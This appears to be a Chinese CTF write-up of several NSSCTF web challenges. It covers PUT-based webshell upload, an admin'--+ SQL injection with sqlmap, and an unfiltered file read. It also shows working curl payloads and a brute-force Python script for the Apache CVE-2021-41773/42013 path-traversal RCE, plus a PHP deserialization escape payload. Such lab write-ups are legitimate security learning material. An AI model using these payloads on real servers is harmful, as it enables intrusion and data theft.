## Round#1

### basic_check

+++

这题的wp说可以看到OPTIONS请求(我没看到)

> **OPTIONS请求**
>
> 1、获取服务器支持的HTTP请求方法；
>
> 2、用来检查服务器的性能。例如：[AJAX](https://so.csdn.net/so/search?q=AJAX&spm=1001.2101.3001.7020)进行跨域请求时的预检，需要向另外一个域名的资源发送一个HTTP OPTIONS请求头，用以判断实际发送的请求是否安全。

```shell
xiaolei@xl-pc:~$ curl -i -X OPTIONS "http://1.14.71.254:28294/index.php"
HTTP/1.1 200 OK
Date: Sun, 07 Aug 2022 06:52:04 GMT
Server: Apache/2.4.38 (Debian)
DAV: 1,2
DAV: <http://apache.org/dav/propset/fs/1>
MS-Author-Via: DAV
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK
Content-Length: 0
```

发现支持**PUT**请求，**PUT请求**是可以直接写马的
![image-20220807150009574](D:\Typora\note\CTF\web\NSSCTF.assets\image-20220807150009574.png)

访问1.php就可以随意RCE了

+++

### sql_by_sql

+++

有个注册面板，很显然要以admin登录才能进行下一步
注册**admin'--+**，然后修改密码，改完密码以admin登录
有一个查询面板，sqlmap注入之后发现是`SQLite`数据库
直接sqlmap一把梭了，也没做过这种数据库的题

+++

## Round#4

### 1zweb

+++

环境有个读取文件的功能
显然是由于没有过滤，可以直接读**/flag**

+++

### ez_rce

+++

ez但不ez☹️
打开页面只有一个**It works**
抓包 扫端口都是什么都没发现
只好去百度一下**It works**，发现是**apache**搭建成功的页面
![image-20220804091405205](D:\Typora\note\CTF\web\NSSCTF.assets\image-20220804091405205.png)

看下apache的版本，百度一下就能发现这个版本有个文件读取和目录穿越的洞
[CVE-2021-41773和CVE-2021-42013漏洞分析](https://xz.aliyun.com/t/10359)
网上流传的payload

```sh
xiaolei@xl-pc:~/web$ curl -X POST -d "echo;whoami" http://1.14.71.254:28226//cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
daemon
```

成功回显

然后ls发现了一个**flag_is_here**，cat死活cat不出来！！也没报错说是文件夹
然后

```sh
xiaolei@xl-pc:~/web$ curl -X POST -d "echo;find / -name "flag*"" http://1.14.71.254:28226//cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
```

![image-20220804095859584](D:\Typora\note\CTF\web\NSSCTF.assets\image-20220804095859584.png)

果然是个文件夹.....
把回显输出到文件里面

```sh
xiaolei@xl-pc:~/web$ curl -X POST -d "echo;find / -name "flag*"" http://1.14.71.254:28226//cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh > /home/xiaolei/web/flag.txt
```

前面有几个带flag，但很显然不是的，先删了
然后写开始py

```python
import os

f=open('/home/xiaolei/web/note.txt')
text=f.readlines()
f.close
j=0
for line in text:
    os.system(f'curl -X POST -d "echo;cat {line}" http://1.14.71.254:28430/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh > /home/xiaolei/web/flag.txt')
    f=open('/home/xiaolei/web/flag.txt')
    print(j)
    j+=1
    data=f.read()
    f.close
    if 'Fake Flag' in data:
        1
    else :
        break
```

官方WP是用bp暴力破解的，这样快多了...我写的时候,不会多线程,脚本跑了15分钟才在9088个跑出flag

![image-20220804100134874](D:\Typora\note\CTF\web\NSSCTF.assets\image-20220804100134874.png)

+++

## prize

+++

### prize_p5

直接给出源码

```php
<?php
error_reporting(0);

class catalogue{
    public $class;
    public $data;
    public function __construct()
    {
        $this->class = "error";
        $this->data = "hacker";
    }
    public function __destruct()
    {
        echo new $this->class($this->data);
    }
}
class error{
    public function __construct($OTL)
    {
        $this->OTL = $OTL;
        echo ("hello ".$this->OTL);
    }
}
class escape{                                                                   
    public $name = 'OTL';                                                 
    public $phone = '123666';                                             
    public $email = 'sweet@OTL.com';                          
}
function abscond($string) {
    $filter = array('NSS', 'CTF', 'OTL_QAQ', 'hello');
    $filter = '/' . implode('|', $filter) . '/i';
    return preg_replace($filter, 'hacker', $string);
}
if(isset($_GET['cata'])){
    if(!preg_match('/object/i',$_GET['cata'])){
        unserialize($_GET['cata']);
    }
    else{
        $cc = new catalogue(); 
        unserialize(serialize($cc));           
    }    
    if(isset($_POST['name'])&&isset($_POST['phone'])&&isset($_POST['email'])){
        if (preg_match("/flag/i",$_POST['email'])){
            die("nonono,you can not do that!");
        }
        $abscond = new escape();
        $abscond->name = $_POST['name'];
        $abscond->phone = $_POST['phone'];
        $abscond->email = $_POST['email'];
        $abscond = serialize($abscond);
        $escape = get_object_vars(unserialize(abscond($abscond)));
        if(is_array($escape['phone'])){
        echo base64_encode(file_get_contents($escape['email']));
        }
        else{
            echo "I'm sorry to tell you that you are wrong";
        }
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

类里面并没有可以利用的地方，所以唯一可以利用的就是**file_get_contents**，利用它来读取文件
**abscond**函数里面的替换加上**emai**l中对flag的过滤，很容易让人想到利用反序列化逃逸来构造一个值为`/flag`的`email`
经过构造
序列化后的值

```php
O:6:"escape":3:{s:4:"name";s:3:"OTL";s:5:"phone";a:3:{i:0;s:1:"1";i:1;s:1:"2";i:2;s:60:"CTFCTFCTFCTFCTFCTFCTFCTFCTFhello";}s:5:"email";s:5:"/flag";}";}s:5:"email";s:3:"123";}
```

替换后的值

```php
O:6:"escape":3:{s:4:"name";s:3:"OTL";s:5:"phone";a:3:{i:0;s:1:"1";i:1;s:1:"2";i:2;s:60:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"email";s:5:"/flag";}";}s:5:"email";s:3:"123";}
```

反序列化后的值

```php
class escape#2 (3) {
  public $name =>
  string(3) "OTL"
  public $phone =>
  array(3) {
    [0] =>
    string(1) "1"
    [1] =>
    string(1) "2"
    [2] =>
    string(60) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  }
  public $email =>
  string(5) "/flag"
}
```

最终的payload

```php
GET:
?cata=1
POST:
name=OTL&phone[0]=abc&phone[1]=def&phone[2]=CTFCTFCTFCTFCTFCTFCTFCTFCTFhello";}s:5:"email";s:5:"/flag";}&email=123
```





